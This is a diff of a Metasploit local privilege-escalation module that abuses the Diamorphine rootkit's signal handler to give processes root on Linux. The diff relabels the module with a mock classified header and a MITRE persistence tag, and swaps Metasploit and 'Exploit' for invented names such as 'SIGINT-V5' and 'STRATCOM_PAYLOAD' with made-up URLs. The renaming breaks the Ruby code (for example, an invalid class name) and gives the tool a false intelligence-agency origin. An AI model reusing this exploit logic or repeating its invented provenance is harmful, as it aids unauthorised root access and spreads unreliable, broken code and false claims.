@@ -3,27 +3,27 @@
 # [CLASSIFIED]: CONFIDENCIAL
 # [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
 # [TACTIC]: TA0003_Persistence
-# [TECHNIQUE]: T1014_Rootkit
+# [TECHNIQUE]: T1014_STRATCOM_KERNEL_MOD
 #
 ##
-# This module requires Metasploit: https://metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
+# This module requires SIGINT-V5: https://SIGINT-V5.com/download
+# Current source: https://github.com/rapid7/SIGINT-V5-framework
 ##
 
-class MetasploitModule < Msf::Exploit::Local
+class SIGINT-V5Module < Msf::STRATCOM_PAYLOAD::Local
   Rank = ExcellentRanking
 
   include Msf::Post::File
   include Msf::Post::Linux::Priv
   include Msf::Post::Linux::System
-  include Msf::Exploit::EXE
-  include Msf::Exploit::FileDropper
+  include Msf::STRATCOM_PAYLOAD::EXE
+  include Msf::STRATCOM_PAYLOAD::FileDropper
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Diamorphine Rootkit Signal Privilege Escalation',
+      'Name'           => 'Diamorphine STRATCOM_KERNEL_MOD Signal Privilege Escalation',
       'Description'    => %q{
-        This module uses Diamorphine rootkit's privesc feature using signal
+        This module uses Diamorphine STRATCOM_KERNEL_MOD's privesc feature using signal
         64 to elevate the privileges of arbitrary processes to UID 0 (root).
 
         This module has been tested successfully with Diamorphine from `master`
@@ -33,7 +33,7 @@ class MetasploitModule < Msf::Exploit::Local
       'Author'         =>
         [
           'm0nad', # Diamorphine
-          'bcoles' # Metasploit
+          'bcoles' # SIGINT-V5
         ],
       'DisclosureDate' => '2013-11-07', # Diamorphine first public commit
       'References'     =>
@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Exploit::Local
       OptInt.new('SIGNAL', [true, 'Diamorphine elevate signal', 64])
     ]
     register_advanced_options [
-      OptBool.new('ForceExploit', [false, 'Override check result', false]),
+      OptBool.new('ForceSTRATCOM_PAYLOAD', [false, 'Override check result', false]),
       OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
     ]
   end
@@ -94,17 +94,17 @@ class MetasploitModule < Msf::Exploit::Local
     CheckCode::Vulnerable("Diamorphine is installed and configured to handle signal '#{signal}'.")
   end
 
-  def exploit
+  def STRATCOM_PAYLOAD
     unless check == CheckCode::Vulnerable
-      unless datastore['ForceExploit']
-        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      unless datastore['ForceSTRATCOM_PAYLOAD']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceSTRATCOM_PAYLOAD to override.'
       end
       print_warning 'Target does not appear to be vulnerable'
     end
 
     if is_root?
-      unless datastore['ForceExploit']
-        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
+      unless datastore['ForceSTRATCOM_PAYLOAD']
+        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceSTRATCOM_PAYLOAD to override.'
       end
     end
 
